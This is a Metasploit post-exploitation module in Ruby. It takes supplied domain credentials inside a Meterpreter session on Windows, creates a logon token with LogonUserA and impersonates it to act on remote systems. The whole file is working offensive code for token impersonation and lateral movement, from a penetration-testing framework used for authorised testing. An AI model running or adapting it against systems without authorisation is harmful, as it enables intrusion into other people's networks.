##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Make Token Command',
        'Description' => %q{
          In its default configuration, this module creates a new network security context with the specified
          logon data (username, domain and password). Under the hood, Meterpreter's access token is cloned, and
          a new logon session is created and linked to that token. The token is then impersonated to acquire
          the new network security context. This module has no effect on local actions - only on remote ones
          (where the specified credential material will be used). This module does not validate the credentials
          specified.
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['make_token', 'maketoken'],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' => [
          'Daniel López Jiménez (attl4s)',
          'Simone Salucci (saim1z)'
        ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_sys_config_revert_to_self
              stdapi_sys_config_update_token
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [true, 'Domain to use' ]),
        OptString.new('USERNAME', [true, 'Username to use' ]),
        OptString.new('PASSWORD', [true, 'Password to use' ])
      ]
    )

    register_advanced_options(
      [
        OptEnum.new('LOGONTYPE', [true, 'The type of logon operation to perform. Using LOGON32_LOGON_INTERACTIVE may cause issues within the session (typically due to the token filtering done by the UserAccountControl mechanism in Windows). Use with caution', 'LOGON32_LOGON_NEW_CREDENTIALS', ['LOGON32_LOGON_BATCH', 'LOGON32_LOGON_INTERACTIVE', 'LOGON32_LOGON_NETWORK', 'LOGON32_LOGON_NETWORK_CLEARTEXT', 'LOGON32_LOGON_NEW_CREDENTIALS', 'LOGON32_LOGON_SERVICE', 'LOGON32_LOGON_UNLOCK']]),
      ]
    )
  end

  def run
    # Make sure we meet the requirements before running the script
    fail_with(Failure::BadConfig, 'This module requires a Meterpreter session') unless session.type == 'meterpreter'

    # check/set vars
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    domain = datastore['DOMAIN']
    logontype = datastore['LOGONTYPE']

    # revert any existing impersonation before doing a new one
    print_status('Executing rev2self to revert any previous token impersonations')
    session.sys.config.revert_to_self

    # create new logon session / token pair
    print_status("Executing LogonUserA with the flag #{logontype} to create a new security context for #{domain}\\#{user}")
    logon_user = session.railgun.advapi32.LogonUserA(user, domain, password, logontype, 'LOGON32_PROVIDER_DEFAULT', 4)

    if logon_user['return']
      # get the token handle
      ph_token = logon_user['phToken']
      print_status('Impersonating the new security context...')

      # store the token within the server
      session.sys.config.update_token(ph_token)
      print_good('The session should now run with the new security context!')

      # send warning
      if logontype == 'LOGON32_LOGON_NEW_CREDENTIALS'
        print_warning('Remember that this will not have any effect on local actions (i.e. getuid will still show the original user)')
      end
    else
      print_error("LogonUserA call failed, Error Code: #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
    end
  end
end
